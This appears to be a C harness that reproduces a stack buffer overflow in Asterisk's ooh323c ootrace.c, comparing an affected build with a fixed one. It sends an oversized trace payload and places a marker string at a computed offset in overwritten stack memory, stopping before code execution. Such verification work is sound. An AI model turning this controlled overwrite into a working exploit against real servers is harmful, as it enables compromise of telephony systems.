// Driver for the VERBATIM pinned upstream block from Asterisk
// addons/ooh323c/src/ootrace.c (fix parent 661d6a2fc5cc7744ab9d849ed3c73ae5066386df
// affected == release 23.4.0, fix 2d7b8c8dc13d9ead8b6f36cc38b6dd91cd4abd3a).
//
// run.sh extracts lines 35-53 (affected) / 35-57 (fixed) of the pinned file
// into gen_block.h under a #line 35 "ootrace.c" directive; this file includes
// it as-is at file scope.  No production statement is reimplemented.  The
// `victim` array is harness-only stack storage in the caller; the upstream
// ooTrace() frame's logMessage[2048] overflows upward into it.
//
// Rung 4 stays INSTRUMENTED: no live daemon, socket, useful pointer control or
// execution.  A setjmp/longjmp escape in the harness stub lets us observe the
// victim before the overflowed saved return address is used (the plain build
// would otherwise fault).  ASan builds abort at the write, before the stub.
#include <stdint.h>
#include <setjmp.h>
#include <stdarg.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

typedef unsigned int OOUINT32;              // ooh323c 32-bit unsigned
#define MAXLOGMSGLEN 2048                   // pinned ootypes.h:149
#define TRACELVL 1                          // pinned ootrace.h:51-52 (no OOTRCLVL*)
#define PAYLOAD_LEN 2432                    // 2048 + 384: crosses buffer + frame

static const char CHOSEN[] = "AST2SHELL";
static char hexchosen[3 * sizeof(CHOSEN)];
static char *g_body;
static char *g_captured;
static int g_calls;
static int g_capture_len;
static char *g_victim;
static long g_delta;
static jmp_buf g_jb;

// Dependencies of the verbatim block.  The real ooTraceLogMessage writes to
// gH323ep.fptraceFile; this harness stub records the pointer and length only.
void ooTraceLogMessage(const char *logMessage);

#ifdef FIXED_BUILD
// Asterisk core dependencies of the fixed block; real ast_vasprintf allocates
// an exact-size string and returns its length, ast_free releases it.  These
// stubs reproduce that contract.  Not compiled into the affected build.
int ast_vasprintf(char **ret, const char *fmt, va_list ap);
void ast_free(void *p);
#endif

#include "gen_block.h"                      // verbatim pinned upstream bytes

void ooTraceLogMessage(const char *logMessage)
{
    g_calls++;
    g_captured = (char *)logMessage;
    g_capture_len = (int)strlen(logMessage);
#ifndef FIXED_BUILD
    // The overflow has already crossed ooTrace's saved return address; an
    // ordinary return would fault.  Escape before that return so the victim
    // bytes can be observed.  ASan builds abort at the write, before here.
    longjmp(g_jb, 1);
#endif
}

#ifdef FIXED_BUILD
int ast_vasprintf(char **ret, const char *fmt, va_list ap)
{
    va_list copy;
    int n;
    va_copy(copy, ap);
    n = vsnprintf(NULL, 0, fmt, copy);
    va_end(copy);
    if (n < 0) {
        return n;
    }
    *ret = malloc((size_t)n + 1);
    if (!*ret) {
        return -1;
    }
    return vsnprintf(*ret, (size_t)n + 1, fmt, ap);
}

void ast_free(void *p)
{
    free(p);
}
#endif

static void trigger(void)
{
    char victim[512];
    memset(victim, 0xa5, sizeof(victim));
    g_victim = victim;
    g_captured = NULL;
    g_calls = 0;
    if (setjmp(g_jb) == 0) {
        ooTrace(0, "%s", g_body);
    }
    g_delta = g_captured && (uintptr_t)g_victim > (uintptr_t)g_captured
        ? (long)((uintptr_t)g_victim - (uintptr_t)g_captured) : -1;
}

static void one_run(int victim_off, int place_chosen, long expect_delta)
{
    char snap[512];
    int first = -1;
    int found = -1;
    int i;
    const int hn = (int)strlen(CHOSEN);

    g_body = malloc((size_t)PAYLOAD_LEN + 1);
    if (!g_body) {
        exit(90);
    }
    memset(g_body, 'Z', (size_t)PAYLOAD_LEN);
    g_body[PAYLOAD_LEN] = '\0';
    if (place_chosen) {
        // logMessage[i] receives body[i]; victim[v] is at logMessage[g_delta+v].
        int start = victim_off + (int)g_delta;
        if (start < 0 || start + hn > PAYLOAD_LEN) {
            printf("PLACE_SKIPPED start=%d delta=%ld\n", start, g_delta);
        } else {
            memcpy(g_body + start, CHOSEN, (size_t)hn);
        }
    }

    trigger();
    // Snapshot inline: the callee frame is dead and printf's own frame could
    // reuse the stack where victim[] lived.
    for (i = 0; i < 512; i++) {
        snap[i] = g_victim[i];
        if (first < 0 && (unsigned char)snap[i] != 0xa5) {
            first = i;
        }
    }
    for (i = 0; i + hn <= 512; i++) {
        if (memcmp(snap + i, CHOSEN, (size_t)hn) == 0) {
            found = i;
            break;
        }
    }

    if (g_delta > 0 && g_delta < 100000) {
        printf("LAYOUT body=%d victim_from_logMessage=%ld calls=%d written=%d "
               "captured_len=%d prefix=%02X%02X%02X%02X\n",
               PAYLOAD_LEN, g_delta, g_calls, PAYLOAD_LEN + 1, g_capture_len,
               (unsigned char)snap[0], (unsigned char)snap[1],
               (unsigned char)snap[2], (unsigned char)snap[3]);
    } else {
        printf("LAYOUT body=%d victim_from_logMessage=NA calls=%d written=%d "
               "captured_len=%d prefix=%02X%02X%02X%02X\n",
               PAYLOAD_LEN, g_calls, PAYLOAD_LEN + 1, g_capture_len,
               (unsigned char)snap[0], (unsigned char)snap[1],
               (unsigned char)snap[2], (unsigned char)snap[3]);
    }
    if (place_chosen && expect_delta >= 0 && g_delta != expect_delta) {
        printf("DELTA_MISMATCH got=%ld expected=%ld\n", g_delta, expect_delta);
    }
    printf("CAPTURE first_changed=%d chosen_offset=%d supplied=%s\n",
           first, found, hexchosen);
    if (victim_off >= 0) {
        printf("VICTIM requested_offset=%d chosen_offset=%d supplied=%s\n",
               victim_off, found, hexchosen);
    }
    free(g_body);
    g_body = NULL;
}

int main(int argc, char **argv)
{
    const char *mode = argc > 1 ? argv[1] : "capture";
    size_t i;
    for (i = 0; i < sizeof(CHOSEN) - 1; i++) {
        sprintf(hexchosen + 2 * i, "%02X", (unsigned int)(unsigned char)CHOSEN[i]);
    }
    if (!strcmp(mode, "asan")) {
        one_run(-1, 0, -1);
        return 0;
    }
#ifdef FIXED_BUILD
    // The fixed block allocates on the heap; there is no stack victim delta.
    one_run(-1, 0, -1);
    return 0;
#endif
    // Probe once inert to learn this build's stack offset.
    one_run(-1, 0, -1);
    long delta = g_delta;
    one_run(0, 1, delta);
    one_run(64, 1, delta);
    return 0;
}
